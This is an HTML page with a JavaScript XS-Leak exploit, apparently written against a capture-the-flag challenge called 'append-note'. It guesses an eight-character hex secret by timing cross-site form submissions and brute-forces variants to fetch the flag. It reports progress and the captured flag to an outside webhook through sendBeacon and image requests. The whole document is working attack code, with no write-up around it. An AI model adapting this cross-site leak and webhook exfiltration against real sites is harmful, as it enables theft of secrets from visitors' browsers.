<!DOCTYPE html>
<html>
<head><title>XS-Leak Sequential</title></head>
<body>
<div id="s">Loading...</div>
<script>
var TARGET = "https://append-note-298af.instancer.lac.tf";
var WEBHOOK = "https://polite-eagle-84.webhook.cool";
var CHARS = "0123456789abcdef";

function report(msg) {
    navigator.sendBeacon(WEBHOOK, msg);
    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg);
}

report("SEQ_V3");

function testPrefix(prefix) {
    return new Promise(function(resolve) {
        var url = TARGET + "/append?content=" + encodeURIComponent(prefix) + "&url=" + encodeURIComponent(TARGET + "/");
        var wname = "w" + Math.random().toString(36).slice(2);
        
        var form = document.createElement("form");
        form.method = "GET";
        form.action = url;
        form.target = wname;
        document.body.appendChild(form);
        
        var t0 = performance.now();
        form.submit();
        document.body.removeChild(form);
        
        setTimeout(function() {
            var elapsed = performance.now() - t0;
            try { 
                var w = window.open("", wname);
                if (w) w.close();
            } catch(e) {}
            resolve(elapsed);
        }, 400);
    });
}

async function trySecret(secret) {
    try {
        var resp = await fetch(TARGET + "/flag?secret=" + secret);
        var text = await resp.text();
        if (text.indexOf("lactf") !== -1) {
            report("FLAG=" + text);
            document.getElementById("s").textContent = text;
            return true;
        }
    } catch(e) {}
    return false;
}

async function main() {
    report("START");
    document.getElementById("s").textContent = "Starting...";
    
    try {
        var secret = "";
        
        for (var pos = 0; pos < 8; pos++) {
            document.getElementById("s").textContent = "P" + pos + ": " + secret;
            report("POS" + pos);
            
            var results = [];
            for (var i = 0; i < CHARS.length; i++) {
                var c = CHARS[i];
                var time = await testPrefix(secret + c);
                results.push({ c: c, time: time });
            }
            
            results.sort(function(a, b) { return a.time - b.time; });
            
            var fast = results[0];
            var slow = results[results.length - 1];
            
            report("P" + pos + ":F=" + fast.c + "(" + Math.round(fast.time) + ")S=" + slow.c + "(" + Math.round(slow.time) + ")");
            
            secret += fast.c;
        }
        
        report("SECRET=" + secret);
        
        if (await trySecret(secret)) return;
        
        report("BRUTE");
        for (var pos = 0; pos < 8; pos++) {
            for (var i = 0; i < CHARS.length; i++) {
                var c = CHARS[i];
                if (secret[pos] === c) continue;
                var variant = secret.substr(0, pos) + c + secret.substr(pos + 1);
                if (await trySecret(variant)) return;
            }
        }
        
        report("NOFLAG");
        
    } catch(e) {
        report("ERR=" + e.message);
    }
}

main();
</script>
</body>
</html>
